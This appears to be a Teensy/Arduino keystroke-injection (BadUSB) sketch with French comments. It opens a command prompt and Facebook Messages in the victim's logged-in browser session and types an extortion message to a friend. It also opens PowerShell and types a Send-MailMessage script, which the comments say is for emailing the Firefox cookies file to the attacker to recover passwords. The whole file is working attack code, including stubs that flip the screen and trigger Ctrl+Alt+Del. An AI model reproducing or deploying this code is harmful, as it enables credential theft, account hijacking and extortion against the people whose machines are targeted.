void setup() {

   const int ledPin = 13;
   pinMode(ledPin, OUTPUT);

  /*
   * Cette partie permet d'envoyer un message à une personne aleatoire faisant partie de la liste des amis sur le compte facebook de l'utilisateur en cours.
   * Une meilleure implementation serait d'essayer de spammer la liste des amis vu que la personne qui va leur envoyer le fichier est une personne de confiance
   * Par manque de temps je n'ai pas implementer la partie ou teensy cherche le mot de passe dans le fichier cookies c'est pour cela que j'ai suppposé que
   * la session est déjà ouverte (c'est le cas pour une bonne partie des gens) 
   * 
   */


   sendMsgFBFirefox();

  /*
   * Cette partie permet de recuperer un fichier et de l'envoyer par mail vers l'attaquant
   * Scénario d'utilisation : Donner le path vers le fichier cookies de Mozilla Firefox par exemple et l'envoyer par email
   * pour ensuite récuperer les différents mdp
   * Pour que la methode marche il faut mettre les bons parametres.
   */
   
   openPowerShell();
   delay (3000);
   sendMail("This is a test","emailsender@gmail.com","password","emailreceiver","mailForm","MailSubject","FilePath"); 



   
   delay (1000);
   digitalWrite(ledPin, LOW);  
  
  }

void loop() {
  // put your main code here, to run repeatedly:

}

void sendMsgFBFirefox(){
    delay(100);
    opencmd();
    delay(1000);
  
    String url="start https://www.facebook.com/messages";
    writeCMD(url);
    delay(1000);

    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(100);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);  
    
    delay(20000);

    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);

    initialise();

    Keyboard.println("Ceci est un message de Teensy, votre ami a été piraté il doit payé pour recuperer son compte");
    Keyboard.send_now();
}

void initialise(){
    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
}

void inverseScreen(){
    Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_ALT);
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(KEY_LEFT);  
    Keyboard.send_now();
    delay(1000);

    Keyboard.set_key1(0);  

    Keyboard.set_key1(KEY_RIGHT);  
    Keyboard.send_now();
    delay(1000);

    Keyboard.set_key1(0); 

    
    Keyboard.set_key1(KEY_DOWN);  
    Keyboard.send_now();
    delay(1000);


    Keyboard.set_key1(0); 
    
    Keyboard.set_key1(KEY_UP);  
    Keyboard.send_now();
    delay(1000);

     Keyboard.set_key1(0); 
    Keyboard.set_modifier(0);
    Keyboard.send_now();
}

void writeCMD(String cmd){
    delay(100);
    Keyboard.print(cmd);  
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(KEY_ENTER);  
    Keyboard.send_now();
    delay(100);

    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
}

void openPowerShell(){
   delay(1000);
    
    Keyboard.set_modifier(MODIFIERKEY_GUI);
    Keyboard.send_now();
    delay(100);
    
    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);

  
    Keyboard.println("PowerShell");  
    Keyboard.send_now();
    delay(100);


     Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
}

void opencmd(){

    delay(1000);
    
    Keyboard.set_modifier(MODIFIERKEY_GUI);
    Keyboard.send_now();
    delay(100);
    
    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);

  
    Keyboard.print("cmd");  
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(KEY_ENTER);  
    Keyboard.send_now();
    delay(100);

     Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
  
}

void logout(){
  Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_ALT);
  Keyboard.send_now();
  delay(100);

  Keyboard.set_key1(KEY_DELETE);
  Keyboard.send_now();
  delay(100);

  // release all the keys at the same instant
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(100);
  }

void sendMail(String body,String SmtpUser,String smtpPassword,String MailTo,String MailFrom, String MailSubject, String FilePath){
  MailSubject= "Test using $SmtpServer" ;
 // String script= "$Body = \""+SmtpUser+"\" \n $SmtpServer = \'smtp.gmail.com\' \n $SmtpUser = \'"+SmtpUser+"\' \n $smtpPassword = \'"+smtpPassword+"\' \n $MailtTo = \'"+MailTo+"\' \n $MailFrom = \'"+MailFrom+"\' \n $MailSubject = \"Test using $SmtpServer\" \n $Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $SmtpUser, $($smtpPassword | ConvertTo-SecureString -AsPlainText -Force) \n Send-MailMessage -To \"$MailtTo\" -from \"$MailFrom\" -Subject $MailSubject -Body \"$Body\"  -Attachments \""+FilePath+"\" -SmtpServer $SmtpServer -UseSsl -Credential $Credentials";
String script= "$Body = \""+body+"\" \n $SmtpServer = \'smtp.gmail.com\' \n $SmtpUser = \'"+SmtpUser+"\' \n $smtpPassword = \'"+smtpPassword+"\' \n $MailtTo = \'"+MailTo+"\' \n $MailFrom = \'"+MailFrom+"\' \n $MailSubject = \""+MailSubject+"\" \n $Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $SmtpUser, $($smtpPassword | ConvertTo-SecureString -AsPlainText -Force) \n Send-MailMessage -To \"$MailtTo\" -from \"$MailFrom\" -Subject $MailSubject -Body \"$Body\" -SmtpServer $SmtpServer -UseSsl -Credential $Credentials";
    writeCMD(script);
}

